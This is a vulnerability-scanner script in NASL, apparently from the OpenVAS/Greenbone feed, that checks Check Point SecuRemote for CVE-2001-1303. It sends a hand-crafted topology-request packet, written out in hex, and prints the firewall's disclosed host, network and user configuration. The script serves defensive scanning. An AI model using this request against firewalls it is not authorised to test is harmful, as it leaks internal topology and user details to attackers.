# SPDX-FileCopyrightText: 2001 SecuriTeam
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/o:checkpoint:gaia_os";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10710");
  script_version("2024-06-10T05:05:40+0000");
  script_cve_id("CVE-2001-1303");
  script_tag(name:"last_modification", value:"2024-06-10 05:05:40 +0000 (Mon, 10 Jun 2024)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Check Point SecureRemote (SecuRemote) Information Disclosure Vulnerability - Active Check");
  script_category(ACT_ATTACK); # nb: Could be already seen as an attack
  script_family("General");
  script_copyright("Copyright (C) 2001 SecuriTeam");
  script_dependencies("gb_checkpoint_fw_consolidation.nasl");
  script_require_ports("Services/fw1-topology", 256, 264, 18191, 18192);
  script_mandatory_keys("checkpoint/firewall/fw1_topology/detected");

  script_xref(name:"URL", value:"https://web.archive.org/web/20020508165945/http://online.securityfocus.com/archive/1/197566");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210208155330/http://www.securityfocus.com/bid/3058");
  script_xref(name:"URL", value:"https://web.archive.org/web/20160804004038/http://www.securiteam.com/securitynews/5HP0D2A4UC.html");

  script_tag(name:"summary", value:"The remote host seems to be a Check Point FireWall-1 running
  SecureRemote (SecuRemote).

  The SecuRemote service contains a vulnerability that allows attackers to gain information about
  the hosts, networks, and users configured on the Firewall.");

  script_tag(name:"vuldetect", value:"Sends a crafted TCP request and checks the response.");

  script_tag(name:"impact", value:"This will enable attackers to focus their attack strategy.

  You should not let this information leak out.");

  script_tag(name:"solution", value:"Either block the SecuRemote's ports (TCP 256 and 264) to
  untrusted networks, or upgrade to the latest version of Check Point's Firewall-1.

  Workaround:

  You could restrict the topology download, so that only authenticated users can download it.

  Go to Policy Properties Desktop Security of your Policy Editor and uncheck 'respond to
  unauthenticated topology requests'.

  After installing the Policy only authenticated Users can download the Topology.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("host_details.inc");

securemote_request_info = raw_string(
  0x41, 0x00, 0x00, 0x00,                                                                         # 00000030                    41 00 00 00                         A...
  0x02, 0x59, 0x05, 0x21,                                                                         # 00000030                    02 59 05 21                         .Y.!
  0x00, 0x00, 0x00, 0x04,                                                                         # 00000030                    00 00 00 04                         ....
  0xD5, 0x7A, 0x9D, 0xF6,                                                                         # 00000030                    D5 7A 9D F6                         .z..
  0x00, 0x00, 0x00, 0x4C,                                                                         # 00000030                    00 00 00 4C                         ...L
  0x28, 0x74, 0x6F, 0x70, 0x6F, 0x6C, 0x6F, 0x67, 0x79, 0x2D,                                     # 00000030                    28 74 6F 70 6F 6C 6F 67 79 2D       (topology-
  0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x0A, 0x09, 0x3A, 0x63, 0x61, 0x6E, 0x61, 0x6D, 0x65, # 00000040  72 65 71 75 65 73 74 0A 09 3A 63 61 6E 61 6D 65 request..:caname
  0x20, 0x28, 0x69, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x5F, 0x6C, 0x65, # 00000050  20 28 69 6E 66 6F 72 6D 61 74 69 6F 6E 5F 6C 65 .(information_le
  0x61, 0x6B, 0x29, 0x0A, 0x09, 0x3A, 0x63, 0x68, 0x61, 0x6C, 0x6C, 0x65, 0x6E, 0x67, 0x65, 0x20, # 00000060  61 6B 29 0A 09 3A 63 68 61 6C 6C 65 6E 67 65 20 ak)..:challenge.
  0x28, 0x33, 0x65, 0x62, 0x38, 0x63, 0x37, 0x33, 0x66, 0x38, 0x62, 0x36, 0x33, 0x29, 0x0A, 0x29, # 00000070  28 33 65 62 38 63 37 33 66 38 62 36 33 29 0A 29 (3eb8c73f8b63).)
  0x0A, 0x00);                                                                                    # 00000080  0A 00                                           ..

if(!port = get_app_port(cpe:CPE, service:"fw1-topology"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

send(socket:soc, data:securemote_request_info);
response = recv(socket:soc, length:8192);
close(soc);

if(!response)
  exit(0);

if(":reply" >< response) {
  len = strlen(response);
  loc = 0;
  for(i = 0; i < len; i++) {
    if(response[i] == raw_string(0x28)) {
      loc = i;
      i = len + 1;
    }
  }

  response_filtered = "";
  for(i = loc; i < len; i++) {
    if(response[i] == raw_string(0x09)) {
      response_filtered = string(response_filtered, " ");
    } else {
      response_filtered = string(response_filtered, response[i]);
    }
  }

  report = string("Here is the gathered data:\n\n", response_filtered);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
